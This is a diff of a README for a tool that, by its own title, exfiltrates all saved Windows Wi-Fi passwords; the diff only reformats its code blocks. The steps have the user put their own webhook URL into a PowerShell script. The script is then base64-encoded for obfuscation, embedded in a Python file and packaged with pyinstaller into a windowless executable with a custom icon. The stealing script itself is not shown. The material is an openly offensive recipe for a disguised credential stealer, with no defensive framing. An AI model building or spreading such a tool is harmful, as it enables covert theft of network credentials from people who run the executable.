@@ -14,11 +14,15 @@ Exfiltrate all Windows saved Wi-Fi passwords
 1. Open  `getwifis.ps1` and replace `WEBHOOK_URL_HERE` with your webhook url.
 
 2. Encode Powershell (Linux command):
-`iconv -f ASCII -t UTF-16LE getwifis.ps1 | base64 -w0`
+```bash
+iconv -f ASCII -t UTF-16LE getwifis.ps1 | base64 -w0
+```
 
 3. Open `script.py` and replace `B64_HERE` with your base64 code.
 
 4. Create executable
-`c:\> pyinstaller --onefile --noconsole --icon=icon.ico script.py`
+```cmd
+c:\> pyinstaller --onefile --noconsole --icon=icon.ico script.py
+```
 
 Executable will be on `dist` folder
